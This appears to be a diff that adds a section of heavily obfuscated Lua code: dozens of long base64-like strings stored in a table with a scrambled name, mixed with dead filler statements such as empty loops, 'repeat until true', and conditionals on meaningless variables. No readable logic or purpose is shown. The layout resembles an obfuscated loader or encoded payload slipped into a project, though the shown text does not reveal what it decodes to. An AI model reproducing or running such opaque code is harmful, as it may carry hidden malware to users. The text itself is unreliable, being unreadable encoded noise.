+_lGHIJKLMNOPQRST_0oabcd[26]='5NG+yfrToP6k7M7u7Oi90e7Y5uO77c6gs+69uPm96ObO7urj2/+9xNn40cP80b6gwujOvvP67sS++e77s9OkoMLp0vug7dGg7tPOyd+kvcHY6r3BvuDl87nY5sPo6urm6N+95ee47dng37zZ5u3gyfn54P7A073z+b3t3P3g0cnlv+rDyePl87/Tvrjo6enE/O++pL7k5tvluMz9ztjM/aT7zvu6vLy+5u3q3Lj56fv+083M6Nng/vHjvvP5uOX7577p7vv+6sPt5M7Z6O3g2fLT5v6k+b3Zur/twbj6vdOk/+/z2/nqw7zg6tH75OX7wt698//y6cm92c252NLq28Lp6ua4/7377t7m5u377szv5L/cuP7qxNn76PvhoM7m8/vqyf7v5dHt4+Du'
+_lGHIJKLMNOPQRST_0oabcd[27]='wf3M/cnj5rjD5aTjvuWk3OHyvcHM6e3c8fvvw8n6vebm2ODc+eDq7aT/5eP7+OfBvdPm3OezvObJ/+XTvOW80fzZzKDA6urt4Oq+xOG7vf3Zvb3B7/i90bL9zcTo0rK5/+PNudn95smg7eX7/fnnue296szk0b3+4Nm9vuLtw8zJ+OrEs+7noMPg6tm6+b/cwNjq5tra0uOk+L7J+7vu/bnu0uPJ+b7EwtLNoMf6vaDu3u/J+/3D2cP55fu6/enJ4NLNuLvT5rjtpNHBu9O8zPHi5dzz4b/M4eLq0cDS0bmg7bzBuqDO5sHg5e6z6cO++7ju3P7Z0snO2er93//o3M340dvo6M7M7b++xLq8vMn5u8PT+6DqueDf5uXo0ea4/t+8++7a6dzjs9Kg'
+_lGHIJKLMNOPQRST_0oabcd[28]='oNnq7cH/7vPB5ejuzO/NzLz7vP672OnR/O3MucPjzLj74unJsvi/4++4oL7H4M7cuqTg+7vt0cTx7MzzoNLM7szY6uPm3r3jw/m9/eDT5dni6L25+fu+ufH/5ePZpNKg77jnxOjvw+Pk0s3E2f3npP7ov8z46rP+573R89niveXo2MPMzNPRoPLp6sThuNHBxOnRweDa0tH/5NHM5eSg07LhvMHhsszM4f7Oye7pztzk09K+7fq/47qkvr66v83Dw/np87L45dG92eq+yeG90cDY5ubb+urm2/nmw7nuzNH5v+bl77y8++e76dH+3szu5u7nw9+kv9Hu2b7Mve7O5v+8vdm/0qS+2O3nvr3q6dmk+e3u7+LRpMPgzu7n/9G52fnqyeLp5fP/+ueg'
+_lGHIJKLMNOPQRST_0oabcd[29]='//vtoOTR6bn86e3+5fK/vuGgw/O92NHJ5O/D/u3y58TA0qS52t/gvqTs6ebO0u378fvvw7rizO7O6u2g3+O95ubtv/794Onj/eLM88P+5qDvvOnJw+Wz3Nvlv6C92b245//g5szvve7g0rPuv9O/oN/4zMHZ+Obu/73oybL67dnx+uXJ3/G+vqTiw9zM6c7c57jgzNm/oNy/3szc7tHN27r64Mm76b65+N7M8+jZv+ay/b3B8f/m/eP5v9Hg6MPupODgybLkoP3J5LzZ8/i8we+/pKC/6qD9w/7l+9n46cH/u+blyfvq28zu0ua+++XZ7tjOzMHk79vN4LLBvOLM7sP66tzjv+7Esv7noN/66ebO6tLm+f7npPvgv+a90r/ZweHl4/v7vNy8/enZ'
+_lGHIJKLMNOPQRST_0oabcd[30]='wfrRxPv8w/696eX75b7luf+gzMnJ5My+v9rq2+P758Hi2erE//rRuf/46cza0r39weDNzOe75szl4tHM2fjqw+PkoNzH/tKg2eLnwb7hv8zs3r37++Ll5vH5w6Dy087+/fi97uP7zOPv+unM7NO+pN+g6dHa0cP72+Xtybvf5cHnvMzEpPvt/vmz5sno6ry57Onq5rr60bmz2MPZ7fvRoO/lvL6g2erBsuzO7uPjw6DH4byg//jqzOzS7sHs2cPRzeHl2fmy6ub/s7/+x//S4//g7qDu78y+s9i8ye2yw8n83tHM8f3m5fmkzqDJ486+sv/DoOTazubu6c3D2t7RyaDp5qC84KDc+/3D87L+6u3v487Z4u3M4+H76PvN+Obb++PpvuG/5czJ4M7R'
+for _=1,1 do end
+do local I1EFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxjklmnopqrstuijklmnopqrstuvRSTUVWXYZabcdefghijklmnopqrstuvwxyz_Zabcdefghijklmno=79 end
+do local _={80,97}end
+do local _1ILMNOPQRSTUVWXYZabcdefghijklmnopqrDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmn0HIJKLMNOPQRSTUVWXYZabcdefghijkl_=881 end
+_lGHIJKLMNOPQRST_0oabcd[31]='zu3M/f3ivsHhvrzJ+ePD3OTR7dn/sr3j8+TS5qDR6r7D4efzwujmzPu8vf778sPm6O/vzO7u6vu/3r3u2/q8oP/jzfPB/b/756C9w9n76e7b/+3Zw+Du2eDev77jvqTEsuSz3MH55cy/0eW5zti9ufv66e7f/+Du36Dm/fja0fPy0uDJx+WyoObe5tvZ4tLR/tK/5sflvKDg3ujRxOi97uf+6aC/0szt4t7qw/H4w8zB+bzJv+rS2drS6sPvvb7z4by/2eDS0czO0urZ8+K/5ufjw+bH4bzJ5NrqoO2g6ea6/rygytrq0e3y6aCz2unR/u3DzOf7zszv+r/JpOW+xM7pzaTf+9Luvv/Rybvuw+6z37zzs9/lwcDq0b6+/87j+6DNvv/57ubC7um+'
+_lGHIJKLMNOPQRST_0oabcd[32]='+b3p5vvz6sT97M2kvOzqucrf5eb5+L/J8+Tlyc7SzLnj+7PcoO3NxP3lv8n/s+DMu+7lwbvZ5bm+5er73/Lp49v94Nz7+u7tuuXSzODazcHfvc3Evdm9wd//0cH87+ag7tnD8/3l6bnC6OnZwfnS2eDZzKDO0aDl+bjM2dnk5aDy2c7Z57jq2fv7pPPv887J8+G83Mn/7f7s7+rE7+W+yeH7vPvb/76+s97q3P355u37stLc7+O8+/v60uak+ebl/Oq8+8f7w7ny073t4tLNuf/j0tzvs9Gg8/i9ydn/zP783urb8eHn87vR6fv5s+X+4NrD7t+y0qDH473m77K987r4zO7b4uW5+Oi+zM344KDZ7OrT36DlxO3/7uX94MPMv+nS7uf55fvi0s3B'
+_lGHIJKLMNOPQRST_0oabcd[33]='2um/zLLlzcHA6b7BwtHO2b3Zw7n7/+Wg+eLnycPivdn/4LzE4NHq3O2kvPO65M7R6N7m/sPs6tuy+7Puuv/pxODfvebJ473b8f/g2eHl0cHD7MzZ7bPquPPgzPu73tGk2fG88/ze0aTC3s77wtnlweLt5u3v5O64suPpoO2gv+b9/dLm5eCgw834v8zg073upP/uw9jS6Nnh5bzZ7+Pq5vrpzsz82s7m8ePSzNvj5fPE6Mz+uuPM/c7Rvr6/6rPmoO/u7s7S6tzh8unmsuG8zP3szMPhv+mgwOnqoO/s0fPl5NLmvuW93OH6s+b5vOXzvOzRxPnzvMz/oL3z2O7S48Pi6u3N/+bu5t+/zOPh57nx4O6g8trRzMrovMng073c4N6gycfk0fPj4by5'
+_lGHIJKLMNOPQRST_0oabcd[34]='2OnDzL/Z0sz//enZvPjpoOjSzMSy+NL+8//mwcHjv9zo7tGg5+W9w+fy6dnlvb3D5ePpzO+g0biy+77J2O7lwfLSpO7a0uWgw/rMzOW95aDZ/824+ujD/r3e7r7l8eD+56Tq5sH7pNnl/M3Eu9/nw/3k7cnN4L/ZuuHl7rz9zcz9/c3B2/vluee+7r7O2b254ePS3ODSzMno6ebB++Wk4/34v9Hn8+rE/7zu28Tfv+P+0uq+3+Ck47PSzuP80bzJ7bvS/uDuv/vH+NHz4tjlwcH9vObjsurjue7l/vm/7sS6u73EuPvOye7o6ub82c7MvPvlweW74O77vem55b3uzLPR7fPH+rzEzf/m3OLToMn5vL3Tx+Hmuezq6NHfvczEuv+9uNv6zu7Z+dLR'
+_lGHIJKLMNOPQRST_0oabcd[35]='wfm/vu390b7//M7Rx+Ln2+bqw+Pn+szuwePg+7jg6u7/surEvvjqyb3YzqD75bzR5f2/+8DpvMTfu9L757vM/uH40cm/0b65zNG90//46e7J4M7mvdLg/vzT6cm6v+e52u29w9jo5tGy/+XjoO/O3Pju58TH+6TR76C8+/Hj0aT5u7PZ6Oi95eP6vvPZs+n7+NnNoP+gvr7h8r+goO2+87r+w8H/++bcuOHmue24pNPt5eDRyeXv89rZ0fO64Mz+2eTS3OG/zL77v7/us97Nyf/+5sy/6ei+5//RoN/k58no6OWg6NnpxMrt6tPZ7Orc/eO9/v36zfP5s+DRzunMzMf9zMHv+e+54biz2fP7zcHN+e7MweTMw77szNna0aDbs9Hqvsn65cnK3szB'
+_lGHIJKLMNOPQRST_0oabcd[36]='4fLD07LhvsT42ebZ+O/M483+vdPj4LLbwOm+w+jq5szt5OrB3/jM7bPY56TD+qDRv+7D0b3Rvdnh8eXBuvG/7ue97cH/+LzM77O9weW4zP24+8z+2/rp8+P4zsy4+9LJ2Orp0+Oy0r6y5O7E5b7p3P/957jn/czmuvPM0ezRvqD54O3E/O7DvqDuvMnm7cPJ57igwfvgs77/+Or92Nrp7vu458PK6szDsuXO4+3kw77D++bZvOS/2d/loNm908PcuOWgzOX/vObn87/77tOk8+WyzLj5vujjoNPg/rL94L78787j4+LNwcHk7sz75bzB4t7moOfiztnZv8PzweLm3Mre77ns37zEwO3Oyb3RssG/6u7E2t7lucLovPPfvu+52/vO3Lr86ri53urb'
+_lGHIJKLMNOPQRST_0oabcd[37]='7/i/3N+4zcPi0739uP7m/vH64Mnjvu37/u/S/uTu6u64+L/m+/jgybjivL7l+ebTvOTmxLPToPu6v8zJoOjNuL3vvszf++j+4/zquODo6ubh8b2gud7qybjszbi4++XjudHtzL/R5rji0enJs+3O+9+9zcTO2bzM4bjSvrnuvfvt5b/JuvLNzLj70r6y4uDu2b/SvubqvcSk++7RuOPqubPTzuPz5by+oNHSzNnl5dGz0s7u4/i8uejp6P7E0e3R6NPNxPzevcSg2unu8unMwcTpzbjC7ubR//vgyfjZzPO8+qTBoNOg5u7Rw9nh5L/75fG9xOW7w/P87s6guvvv2+377tvY087Z37Lu2/rR5aDz4ufz+Nnm5djq6Mzjv7PZuenvw+fizr6g2L64'
+_lGHIJKLMNOPQRST_0oabcd[38]='7b/S48nivcn40sPT+eK+vvnkvdPJ4sPz6OjRvuDY6tz/+tHJ+fzRxMLRssH+0sPm5/nM7tvkoPPk2L3Rs+/Dwb3epMzE7tKg++Tl8839zMzK2OrT4tHpoOLSw9HE2b3u2/nD7ubTvsPM6cPJ7+DD7u+70cPts73Z56TDzOX7pO7fuObJvv3m5aTk6aD408y42f/t7r3SoPPM3ueg4/3l0crS7cS52ebRw+Xu7uH67cH788PE4tO80ef96ebg0eagzO+9xPPiw+bhvqTM2eLOoPmkw/7ZvqS5+tPqw/vlve250ry+/frnydre7cng0u3c+6TD3Pv65fO6sr3J/ujD0bnT6u7E0ej757vt0eO7vcHj4MzbwtKgxNv+5tO/0c6goOjm/vng76D77Orb'
+_lGHIJKLMNOPQRST_0oabcd[39]='8ujD/uWz6tHE7eDu47juyeH/vPu85MP747K+ycfizu6k4+buzOnpvsH67ePN5eegpOLS3LPY6rjO6u/B/tHl+++958Oz3szM+aTSyc7S6bnB5LLz8t6g3Pvy5tv66qTcytPDuf/6vePD5ODusv3MoODvzO244M254aC82fjp6tzZ/b3cw+PO2fzpvNH40ebJuvG/+7vSvMn/vObTzf/M277g6ubi2L7D++DuufLezPu4++654bPm07756Mzm0c2+vPngzPLa0qC70+/zoNHMwb7kztm4+eX+oO3qxM7R58Hnvem5xO29w+TYvtvi2b3lu+3OzP3j0aD86szZ2+Xg5u3y5b6+++XEwtKgwcfiw/7y6tHE5fvm5fm/0du92ObmvuPS/vvj56C6/8zR'
+_lGHIJKLMNOPQRST_0oabcd[40]='57/MzO/kpLnb7NLZs9nmxMP9ve7H4Obj++Pp++P/0tnb7M25ytnOzMfj6szH/+r+6NPm29/x5e6z7s3J///p+7L/6ebB+Onc5fPpzKT9zLnO0uig+b/RoOO9vdnfvqTM6NjlucP4w7nZ49LM56TqwcP45u3E2ea+4tLRyf7o5f77/+fb/Oq+xNvjvcHN5LP++f2/++Wk0cTj/b25pP/RwbL4vO75u7yg2+XvzMTtzO7A0rLJzf7RxM7v5czO373Dv+/uw8DpvdO72ebmpPrq88Dove7B4+W+wN7p++be6fO4/enm6Ong/rPYw/uy/czE5b/q5ejtzNv75e3E7/zRvvv5zKDM787m8/vMoM7q77jz/szl5fvv2+O/zPvh+e7J4Ni95ezt5cGk5NLM'
+do local _={39,48}end
+if IIGHIJKLMNOI_XYZabcdefghi1~=_1ILMNOPQRSTUVWXYZabcdefghijklmnopqrDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmn0HIJKLMNOPQRSTUVWXYZabcdefghijkl_ then else end
+_lGHIJKLMNOPQRST_0oabcd[41]='5O3DzLz44NzJ5aSgzN7D2czSoNm/0+fE/N/gyf3s0fPnu+Xz7u/D2e7Ss9G4/uDmyePS2eTfv+6y/83Jsv/m2b/R0vvO2dLRuejnpLLlsszE7erM3/G/zKDu0cHA7uDm5/K9zOLf56C/2c2436S//sn/0czs6ujmuuO95bjj4MzM2MPE46Dp2cDt6cHm2eq+7fu8ubq/0vvt5L6k4O/Dwdng4KD5/Onjs+m/7qTkw8nk3ub9x/rlxP+9s8na0b/jyeXm2eLZ5bny2ObMx+PS2bLi5szv877b+bzM48zZ6vuy5L652Om+xMTu6tzJ5NGg//zRueG45f7/5b/Z2+XuoL7gzMnJ4M7+8fjnzM7q5aC+/c7m8u7S0cn57/Pt/83zsv3q3Pjq4O7N++X7'
+_lGHIJKLMNOPQRST_0oabcd[42]='8/7S/r3v5tzB++X+5tKkoNrtvMn+7dHEudHqw9njvPvB4uDJzum97rL4zP2g6uj++fnlyfHk4MnN4ur97O29ufm/6f7f+dKg/77S3NrR7ebl5O7M2eDO++W+ve696c3M7bvo3Nn4zObh4Or72+G9xLLk0fPC077B7u/pvuDR6cnY78zZvOPOzOf+0aCz08O+2tjS3Mf/zczt+b6+//vMycnks9G65ebt5/nt5t+/6rjv/+rB/tHoyeH+zcHfvcO5s+m8zLnq4P7547+g+eLMuPvs0czn+ObuzO7OzMP77u6709Lc573MoMHgoMz+3rKk7/3D/vLp0cG/6u/buPvM5b3ovP7vvMztuv7l2dm45tnA2MP+uejm3LvSw8z+2s3E2trD5uLvzObhvefJ'
+_lGHIJKLMNOPQRST_0oabcd[43]='v+/p5sze0b685bzu477lwcDu5vvJ+erM2/jg7u34w+7J4OfDwf3RydnhvMHb7OnEzeW97tm70cn478z9vvrD7uPj0tG847/Rs968ue3lvNy/3qTJpOPR883/6cnj/tLm4fLnuPHl6cT74b64uOS95t/6s+7hoOW5zfnm2fjS6qDK3rP74frp++Tq0cPu0unE8/292e380b7fs8P7/NrRuPjvw9nn4tG++f+9vqDSpMnH+M6gzeXM49+94Ny/6Oek5O+9yfPh576z0b/Z7tPSvs7Rw6Du78zu8ujl89ny6b7J5czZoO3MxPzo5aC8+tGk4u7mzM3g59vx/enE4frNyezf5dzE3tLc576zyb/u0bn7su77v+2//rz4vOb+2sPB4NKz0bne5e79/eag'
+_lGHIJKLMNOPQRST_0oabcd[44]='7eLp5uHl6uXu0b7B/f7l/sre5cTZu73t+uq9/rnZzvvC6qTE7f7MweLZzOO92MPc+bvMubnSoO3lvczc4/nt3M3g6fO53qD+vdHq7bPovvP+7+rj77K+8/+8zdvu7+b7x//MxPv56e783rK5ztHqzNvg6sHu6ebB8fvN8+PzzO250ujj5NHqyd//5tG68tHE8t7l7v3gzOXb/ua+7NOg08Hj5fvE07254/Plyfvj0cPC6Mzc2NLRvr3evb7o09HDuvjM4/jt5v66/9LJ/6S8ubj5vsH82eD+5NG94+/6oNnC0dHB7um+8/rZzLnm0b/J8eTvwbq/s+bO777M5u7MuMng0v7j4b6gu9Lg/r3vvcz7vrzT57282d+/76Dz+7/jxNPRyebZzbm97+q4'
+_lGHIJKLMNOPQRST_0oabcd[45]='5+zM0+/+ve252czE5Ojp7rri6dnC6e2+vdnSzPLo4O740rLJ7NLtubr/w/vJ/+64weXM5vn/0fP60u6+5eLl7vmgzNzl5cPm7eXq0fzezb7fuObDsvvOoOW46uP54On+yui9xMre6cG6/tLc7eG//trv4KDD++bR2b6g4+H/0czo0+257ti8zPPivfPJ5efB/N+9uNrS7ty++s25svrpufmgvqTH/r/M/t68/vuk0vvJ4bzB/Ojm+9m+vP676r+g4tOz3OGz5ea6473cwf/O2e+/4Nnvv++4zOrnoN+yzO3E06Dz8tKk+83hvMTu3uXu8+Xl8+7S7tvm6ej+8f3SyeHhv9nnvszm4/q+vtjuzOWy47y52tm/oOjovszb5bzT+N7g/sP/vsPg0+a5'
+_lGHIJKLMNOPQRST_0oabcd[46]='zNjpye++vsn9+ebJ3+DM7uXz6uW6pOeg+77vwf+85sTn++XZ8//vw7/TssT5vrLJxNi82d/7s+a++Orj+7LD+/nk6aC6vMPRzOq9wfP4v6Cz0b7z4u3pvvrovdvY0+7j5ePM7b3tzdv/7MPm5eTnw/m97u7g7dLjyujp+7qzzNHZ4b3B///O/rr7pPuy++rczeW8uebRzv6k4L/Ryf7p3MDqsrjl89Hb/eDlyb/T7tnM3umg/6Tp5vv96dP55aTc+fjnvsLYzsm+4+C+xNHnoPPgw8nf/unT3+Wgw/jqzMy6/83b/O/ovsrSvdPu0+n77bLq+7L4zP3//uXzs9npxPHjvO652Oq+u9Po+8rev/7j8b3J+/++vsP/vszv5ebt/Om95fvxvPvy78z9'
+_lGHIJKLMNOPQRST_0oabcd[47]='+Oq+8/3gssn5vbPJ4/G87tmzzcP5vrzEwtnRoM7ovePj/+n+zunq0e7RssTB+c3b6NOk8+W95bn9+r7J2Nm/+7vRvvPO6Oeg56DnxM7tzKDju+agzNO847nqvbmz7b/jztHm3Lq4v9zu6eC+5+Du4+7vzOb9+tG+w/+/oPvk76TE6b25//zR88Tp6Nza2L3B5+Lp3OXi6uXy3+fDztHO7u7TvcTa077D2+Tl4++978HJ/tL74O3nxPPgvNH809HE+/28zNvk76C56r7E2O7M++f9vsPl8r64/Oq8xODu4OP807LM7NHvufH96fvg6L7D5tO9/f3s0tH95b3Z5b7O/uW77f68+szMuOCkoOfy0snZ4+bRztLo+87Z577o2OXj4fK+uLj95b7i0e25'
+_lGHIJKLMNOPQRST_0oabcd[48]='yu7qzPPhvKD/uNK+2+K/++TY5rjJ/r3Du9LM07vS6Obm7szZ/73m3NrTvszO0+W+oNjMufPhvszt+ubBwf7DzOXh56Ty3725+fLmw8H+zNuk4O/E7tLMxPjp6tPY3rOg47zS/sLpzbjg7b3lzu3S5vuk4P7O2bzu+tO9vszfvMTZ/OrRvv7p/v3g6sPu0uD+uvLRxMDu5vvZ/OrM57K95vu4v6DjvOnB57LDuczS0czC0eju47zm7d/l6czB49LcurLO+839w8nk7+DM4u+/zPrf58zh++egoNPg5sDZzKDl883J7t7gzOXlvPvo0u/zuuLNwb3uzP7H++rux/np0djo5dO6/b3c8/jO7vns6sTv873T2NHmoLnq6v3ZuL7bztPgyef8zcza0aD+'
+_lGHIJKLMNOPQRST_0oabcd[49]='+eDu7tm46tGk5dHBvejDxNnxvO7/vMzc7/7Duebu0szs07Pcsvm+ybr7zNzm07yg8fqgyeH/0sm53uC+wNHDzKDS6snu2b/uzeO9w8H67snfu7LB/7Lu7uDT5ebH7My+suLp0e2/0aD5s8zD2by+oL3o6cnZ88P7yu3m0f/zvsPH/uDmvP6888HizMTf+em53/+8ueLuvKDy7ufD7Oqg5frY6snk0+3R++Lq87PuzqDv+qC42bvMvqDSzszu773juvvpvr3e5czf4M3BuvjnueP4w+Pv/+nBu9Hq7fm478Ha07KgsuPSoLjlzO24/87j/trDoKT/4OO76cOgzePq0+37oMTnstLJoO/l7vjZ6cnN/c6++O+84+W/pLnx5eDcw/vmyaT776To3rz+'
+_lGHIJKLMNOPQRST_0oabcd[50]='5u/t2fn/4OO+/s6+/NLo47j40vvf877bu+7g/rri6fPY2c7+vPrDzP7v6fv60ubm5Oi/vubf4Nnm3tG+4urm89+4vf3s2urbwfjS+7Pp6dz7uNK+4+K//rr7zdvC2efb//vqw9jp7dPA6erlv+nDzOfzvcT46e7E/6TlufP60czl+8PZ/NPg/r3es8yy4b3E+ePM29rf5fPu3+bR+77m+9+97cn86rzJ4u3pyaDq0r7vpM7us97gyfv776DB4ebmzfvDue+y5sG72cPZwfjMw6Do5dHh++bZ/frS4/7Y58PZ4bz+37vn8/u7zKDb/ubbur3MzLzi6cmg6uju+urD++Xy0uby6MPR7eLMzO7Z4PvY0rzRu+q97fvzvfPa6cy4xNjq/d++zNH82c7m'
+if IIGHIJKLMNOI_XYZabcdefghi1 then LMNOPQRSTUVWabKLMNOPQRSTUVWXYZabcdefghijklmnopqPQ=94 end
+for _=4,3 do end
+repeat until true
+repeat until true
+_lGHIJKLMNOPQRST_0oabcd[51]='37i9+++z6e7luO6477zl0e2+zqD+6L3ZwN694+Xy6tnN+MPc8unu2efk7sz/7NHD/u/l0fPlw7nj/8zmu+q8wePhvP7/+uDMoNLM5ejRw+bf/bzJ+O3RvvPgpKDz5NHE57jtweG+0tzZ/OrcvuDq4+Oy5sH40ujM+b7O3P7S5ubj/sPZ36S8/u7qoOO53urt5O/mufPl5sOk5M77vv29yfvz0bnK7ubTvuWg7b3p5cTk3rLB4OnozM7Rs/vk6MPz4NLMw/P77rny6rLEpOTO5u2/vbnns9Gg/6S9wbrivbjO7erZ5b+kufLazczn4ODR+/+8oMH96tnY6em+5eG+oLzlvqDC2OrD2eG87vHlve7z+urM//jpxPv86b7+2szuwNm8wfLt5v7t+c7J'
+_lGHIJKLMNOPQRST_0oabcd[52]='7+Xo7uLYvsHK7uX+8tPq477kw8z/4+mgzu/t3M7q0cGz0c7cwOjD5uX+vri907LE+NLnwee+vczl8unuyujD887T4Mz7/unE5+PlubrlssTv/b642eHl+9ni6cny783M+tjp2bvovsyz2erbuOCz0f7R6qDo7+3J/+XuzKT+vMz788PZ7+Xq49n7w7nH7Mzc4f7m08n/vePa0czE+tOgw7j/vMm70unR+O7S7v39vdm56OnRzu3p0ejYv9HK7tG+3/HmxP/6sqDJ5Oa54fPSoLL6svPs7+/D/ezp8/uz0syk/73Ew/nDoPni6szD7MOgs9jgoO3xv9HC2erz3/PnwbvY5qC92b/J2eTMoOzes/77v83D+tPS2drv5f7N4r/m2/qz5u/8zNnk2eX7'
+_lGHIJKLMNOPQRST_0oabcd[53]='+bLDzKT+ve7C2b7b/N6/3MPjzqDa2NKgoNKz2frRve766qDt5+Sz3P3l4MnK6r3+/NnqueOgzvu/2urJzOi8zM7R6Pv7s8zuw+TO5ujo4NnZ5ejM5/PS2b3p6bna6L3Z8fu9vrLj0u6978zms+nMueGk6ePZ/urbuuPMycH50r66+dGg37zNwcn7w8zK3sy5uvi87qTg6sy8/+W58frRuP7vw8za07/Muru+uO35w9zY7uDMsvuz3MTZ6rjO7+DMxO3Sye7T0ty6+L3J4/i82cTozdv94ebz2Oi80frSvbnY6Oek+eW+27PZvOPB4uDj/t7S3MPjzcHi3tG5wtrq5dv5vcno2NLM5b+kzOzS0cPf4KD95NHpwfu959vvvObu2ujl2f/+6bnt7MzJ'
+_lGHIJKLMNOPQRST_0oabcd[54]='vdLS5vP4vr7K7+rRu9jRyfjZw7nk2L6g4bik7vn5ztHh/NLm777loPPi6sHz+M7mvuTp2f/l5qD40e7zu+7p0fjazNzZ8r25v++/5vnyw+7N5ebcvOPSvsH6v/7E6L2+2fru2bvo6u3f8tHzud+92czZ0ubJ+7zE6N7SoO/y6dn9+M7747LnzMTSssz/5MPZvOLpyb776bn78tLM/NLlzO3/5cG+/b3uzt7M2+X8zO3f/+r7//O82cfi5szJ4tGgpOK+pMn45czvu6TT++zM4/rYv9ny0czbw/i97uXj0aDD/cy58fq+ueDuvP7k0+3737zD2fn66uOk7OnM5/vqw+e8zcy6+9LM//jD2dn77rn5+NLm+//t+9rt6sPZuLPjzf3O2crS0aDh4NLm'
+_lGHIJKLMNOPQRST_0oabcd[55]='47jt873qoNHy6czJwfrgzPng6fvv8tHb+OjRoOP/w8TH473M/Oi/++e/vMHfvsPzxNO+26T4vczg6u3E7Nrq7vLo4O7O3urb8tjnoN/jzvvx+7/u7bO9vvLtv9zg7uDZpPvq5eP+6ePJ+cO+ztPozL7+4Mzs0unjyf3Duc7qpNO+4Mzm2+DqyeG9sszN5dLj5bjOyeG80tz5v+bu/NO//ue+vKD+0+XcuqS85tjTvMTt/uW+/O+/5rriw9no0tLu+O7lzKT/zKDN4r3Mwf2/7szZvsOy4uW+7f/n88zYzMzO7eXMs+3gvqTk0sz5oNL+yeTDxPLpzfP7oM3B/O7m+7Ljw8TD/eq42Ongvs7SzLmk5NLuzfq92/n96v7jv+Dcud6kzM3kw8Sz6e3c'
+_lGHIJKLMNOPQRST_0oabcd[56]='4+zDufuyvaDa0u/BvuC80/m476DZ4LLMyeTl4/P5veO/6ebb//jnxNn+veP7+bz7ue+98/ztvcT/5OX7zO/lwbr96vPs7uq4+uqkvvH67dnH4L7z8/nNudjZ0ub75eq4vPvlyejS58m73u7l7eHlxL790aDs3rzmu+7DoMPkpKD55erc47LMxPu75sPjveW55bK9+7zg7rm85LzT2eO+pMnivsP42erD46Tm073ev9z/88zR2bikxLnTvPvnoMzmv9GgzLjg78HK6tLj5tG8/u7ovsm4+uDJsvnD08LuzMP82sOg5ePNxP/76ePK3r3Z4u7m2/+45eP87c2+uvzqueTp7eb/v+rB377m2aTi5vvD/efM3/i92+jow8nnve6+zeTm2f7SoNzh4MzZ'
+_lGHIJKLMNOPQRST_0oabcd[57]='8/3lxObRztna6qSg5/+//vLev/vnvu++svrnoObTvczx4+e4/+G80fH5zbm96eb+2/ro++H6vqT/5eDmyfqgwe+9oPvlpMP+/O6+yf344O7B5e/b4tLqwfnlvPug777D2fvl/sre5vu/0erBw+DnxPn46ea8+u3EuP3RxPng5vO77r3RpPm9oNjv7cznu7Pcyfvu2cTpv+P+07zcuOHnubjgzO3o777b2fzpoLrhvPPi0tLjudrq2cfkzNuz2sP+6OnNye39zb7vvr6+573toOX677jk7ubmpOXoye3lzbj60qC47f3NuMf40qC76dLR5NjRwcTtzMzns87u4NK9/rz56MzD++rZ37jquPni6dmy5bPM+/PMyefgpP7h+cPEs+rSzM3/6ObhuO65'
+_lGHIJKLMNOPQRST_0oabcd[58]='+bLgvuP4zNP7uL2+5frNpPjo57ng6enT4/PD0bz4vdO72dLJ4bvMvtn50fPB+7Pjw/vnoL3TpKDB+e6gzeTO/rjhvdHf5KTMurLquLrivdPa0s3E4NHMoP+gzPvC2LzcwNi9wf37vPvE7efB5tHq4/H9w8nx/c25zu/u/rzs0cnZ4ebDpOTS/sfjztnt7M7u7t7M5c3g6vPhvL3z/fvlxMnjvbjn4ebBoO3Svvnzzr794O7+4/zquPvi5cz46qTMw/m947jgvdPg2ODR8ePN8//65tHJ+OWg2trS5v/g6ty6vufM8/nl2bvS6dnt4O/M/NOyoOfi5f7g6czuzfro2cP+6b6/2c7u/+XNw6T4zsn62unZwuq80cTSoOak+qDb/O/lubLkvNzB+enE'
+_lGHIJKLMNOPQRST_0oabcd[59]='/+Tqudjuw8G65bLb7tO8ycrSoNv46erz+NGg3ODY6e7D47zmur28+7j95u7l+8y47f/lzPjvzv696s7J8eDSzMro4O697+nJuPuk86T9w8Tn/eru3+S92b3qzubJ+8zBvOzSzNjR6r7O2unzzOjg7rPRv9n9/emg2N+90djYvOPH5eags9m/3Lzkw9Hu7b25+OrlweXx4Obl5e65zfvq7rj90v79/dL+x//p2ebtvPPK6en+vv2+oNrpw9zg7+DM37+zycTe5f644un74eDpxO36w8zf4ub9vdPMuLz67czt8+n+/tKgoM7uvszE6b3lzfrpxPn66eP95OXM4OjM/bPSoPP75erJvOzqoPHj5r7B+czE5+K8uefgw/7v4+bz4NHp2b3f56Tj+cP+'
+_lGHIJKLMNOPQRST_0oabcd[60]='5Ojg47nY0szx++r9oO3nudnl5qDt+urlw+C+w+/g6ePN4ubTzu/SzPjYw6D58unR/OjOoLz+v+Pm7szJ5b3qwe/90ty97b3c2tnRwbvtzfP5487Zzu3S2fza6rnN+eq4x+DOoPzew9zj/unZztrS2eLa6r6k+r7J/7/m08razMHE09LZzfvNpMnjzv7O0szz2u6+ye2/6tPZ8+bR6Nm88+P+6ri+47++5eW8uaDv7vPu6L7b3+C8wbPfvrmy+OfM4/jloOja0bji2OrMuem8/u7q0cyg2L++4fLD5t/i5v2y+9LmxOjp2d/lw+77vcz76OjDucHgpLnx487J47+9/eTSv8nj/8P7+fuk5ue+5syy+OrM+b2zzMDeoNHD+MzJ/fvnudn676D5/Or7'
+do local _=585 end
+for _=1,5 do end
+if I1EFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxjklmnopqrstuijklmnopqrstuvRSTUVWXYZabcdefghijklmnopqrstuvwxyz_Zabcdefghijklmno then _1OIJKLMNOPQRSTUVWXYZabcdefghiCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijkIKLMNOPQRSTUVWXYZabcdefghijklmnopqrstVWXYZabcdefghiYZabcdnopqrstuvwx=69 end
+_lGHIJKLMNOPQRST_0oabcd[61]='3+zR88rZ6dHm2sPu8eDqw/vs0u7E2OX74u3NoOfjw/uk/uX78+Dpubj64P7409G4///g2fmy0bnb5O3E+O+87tv6v6Dy7eDuuP/S7uOy0czl5Omg5+K8wdvg6e7H+b7Mvvq92cnhvcTB4eWg5aDm47Ll0fPt8tGg3/PqyaDu5bn66r3Z4bzS+7L/vr7nuOXcoNKg5ezvzty8/+nZuP2+zOLY6r7n/sPm2/jNxP/l0cPu06TRs+68/vzqs/6y+enZ8unD48flv/vY077M4+XS7srZw+7O78zluOK+zNjZ0du76ObZ2/7pvuzozMn78ryg4b/tycDTvsPg0dLM/N/m++/96fO+5M25svm8vvze6cTy0bLzyfrp5uO9zP3g77/u/73myb3vv6Dn4eCg'
